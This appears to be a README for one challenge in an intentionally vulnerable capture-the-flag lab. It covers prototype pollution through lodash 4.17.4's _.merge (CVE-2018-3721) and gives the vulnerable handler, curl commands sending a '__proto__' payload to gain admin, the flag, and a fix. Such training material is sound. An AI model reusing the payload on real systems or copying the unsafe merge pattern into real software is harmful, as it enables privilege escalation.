# A06: Vulnerable and Outdated Components

⚠️ **Intentionally vulnerable — do not deploy to a real network or reuse this code.**

## Scenario

A profile service. `POST /api/profile` merges your JSON body into a default
profile object and echoes back the result.

**Play it in the browser** — open http://localhost:9006. The page's Changelog
card names the exact dependency and version (`lodash 4.17.4`) — that's your
lead; look up known CVEs for it. Then edit the JSON in the "Advanced" textarea,
click "Apply settings", and check "Admin Tools".

## The bug

`package.json` pins `lodash` to `4.17.4`, which is vulnerable to prototype
pollution via `_.merge` — [CVE-2018-3721](https://nvd.nist.gov/vuln/detail/CVE-2018-3721),
fixed in 4.17.5. This is a real, public CVE in a real, outdated dependency —
`npm audit` and Trivy both flag it.

```js
// BUG: lodash@4.17.4's _.merge recursively assigns into "__proto__" keys
// instead of treating them as plain data, so a crafted request body can
// pollute Object.prototype for the entire process.
app.post('/api/profile', (req, res) => {
  const profile = _.merge({}, defaultProfile, req.body)
  res.json({ profile })
})
```

Because `_.merge` walks into `__proto__` as if it were an ordinary key, a
request body containing `{"__proto__": {"isAdmin": true}}` pollutes
`Object.prototype` itself — every plain object in the process, including
ones created later with no relation to your request, inherits `isAdmin: true`.

`GET /api/flag` checks `({}).isAdmin` on a brand-new object:

```js
const requester = {}
if (requester.isAdmin) { /* ... */ }
```

## Exploit

```bash
# Before: no admin access
curl -s http://localhost:9006/api/flag
# {"error":"admin only"}

# Pollute Object.prototype
curl -s -X POST http://localhost:9006/api/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# After: every object is now "admin"
curl -s http://localhost:9006/api/flag
```

## Flag

`CTF{a06_kn0wn_cv3_1n_d3p}`

## Trivy note

This image is *expected* to fail a Trivy scan — that's the point. See the
repo-root `.trivyignore` for the deliberate, documented exception that keeps
CI green while keeping the finding visible.

## The fix (for reference)

Upgrade lodash to a patched version (`^4.17.21`), and never merge untrusted
input directly into objects without stripping dangerous keys
(`__proto__`, `constructor`, `prototype`) — or use `Object.create(null)` /
`structuredClone` where prototype inheritance isn't needed at all.
